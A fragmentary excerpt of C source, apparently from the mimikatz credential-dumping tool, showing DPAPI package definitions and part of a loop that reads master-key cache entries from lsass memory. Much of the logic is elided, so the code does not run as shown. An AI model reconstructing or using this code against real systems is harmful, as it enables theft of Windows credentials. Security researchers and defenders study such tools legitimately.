...
*/
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = {_CT_("dpapi"), NULL, FALSE, _CT_("lsasrv.dll"), {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = {_CT_("dpapi"), NULL, FALSE, _CT_("dpapisrv.dll"), {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
/*
					...
					if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_MASTERKEY_CACHE_ENTRY)))
					{
						if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
						{
							...
							if(aKey.address = LocalAlloc(LPTR, mesCredentials.keySize))
							{
								...
								API(KERNEL32, LocalFree)(aKey.address);
							}
							kprintf(L"\n");
						}
						aLsass.address = mesCredentials.Flink;
